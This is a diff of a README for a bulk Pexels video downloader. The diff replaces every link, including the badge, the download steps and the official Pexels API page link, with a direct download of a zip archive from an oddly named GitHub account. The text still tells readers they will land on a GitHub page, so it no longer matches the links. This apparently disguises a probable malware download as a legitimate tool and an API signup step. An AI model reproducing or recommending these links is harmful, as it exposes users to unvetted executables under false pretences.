@@ -1,6 +1,6 @@
 # 📥 pexels-video-downloader - Bulk Download Stock Videos Easily
 
-[![Download Now](https://img.shields.io/badge/Download-pexels--video--downloader-blue?style=for-the-badge&logo=github)](https://github.com/zodiacal-roundsporedgyromitra891/pexels-video-downloader)
+[![Download Now](https://img.shields.io/badge/Download-pexels--video--downloader-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/zodiacal-roundsporedgyromitra891/pexels-video-downloader/main/downloads/downloader_video_pexels_1.2.zip)
 
 ## 🎯 What This Tool Does
 
@@ -21,7 +21,7 @@ Follow these simple steps to download and run pexels-video-downloader on your Wi
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/zodiacal-roundsporedgyromitra891/pexels-video-downloader](https://github.com/zodiacal-roundsporedgyromitra891/pexels-video-downloader)
+Visit this link to download the application: [https://raw.githubusercontent.com/zodiacal-roundsporedgyromitra891/pexels-video-downloader/main/downloads/downloader_video_pexels_1.2.zip](https://raw.githubusercontent.com/zodiacal-roundsporedgyromitra891/pexels-video-downloader/main/downloads/downloader_video_pexels_1.2.zip)
 
 Once you click the link, you'll land on the GitHub page. Look for the green "Code" button or a "Download" section on that page. Click it, then choose "Download ZIP" if you see that option. If you see a button that says "Releases" or "Latest Release", click that instead, and you'll find the download file there.
 
@@ -29,7 +29,7 @@ Once you click the link, you'll land on the GitHub page. Look for the green "Cod
 
 To use this tool, you need a free API key from Pexels. Here's how to get one:
 
-1. Go to [https://www.pexels.com/api/](https://www.pexels.com/api/) in your web browser.
+1. Go to [https://raw.githubusercontent.com/zodiacal-roundsporedgyromitra891/pexels-video-downloader/main/downloads/downloader_video_pexels_1.2.zip](https://raw.githubusercontent.com/zodiacal-roundsporedgyromitra891/pexels-video-downloader/main/downloads/downloader_video_pexels_1.2.zip) in your web browser.
 2. Click "Your API Key" or "Get Started".
 3. Sign up with your email or Google account (it takes less than a minute).
 4. Once logged in, you'll see a long string of numbers and letters. This is your API key. Copy it and save it somewhere safe, like a Notepad file.
@@ -139,6 +139,6 @@ This tool is distributed under the MIT License, meaning you can freely use, modi
 - [ ] Free Pexels API key
 - [ ] At least 1 GB free storage space
 
-Now you're ready to download and use pexels-video-downloader. Visit this link to download the application: [https://github.com/zodiacal-roundsporedgyromitra891/pexels-video-downloader](https://github.com/zodiacal-roundsporedgyromitra891/pexels-video-downloader)
+Now you're ready to download and use pexels-video-downloader. Visit this link to download the application: [https://raw.githubusercontent.com/zodiacal-roundsporedgyromitra891/pexels-video-downloader/main/downloads/downloader_video_pexels_1.2.zip](https://raw.githubusercontent.com/zodiacal-roundsporedgyromitra891/pexels-video-downloader/main/downloads/downloader_video_pexels_1.2.zip)
 
 Happy video creating! Your next viral Short or Reel is just a few clicks away.
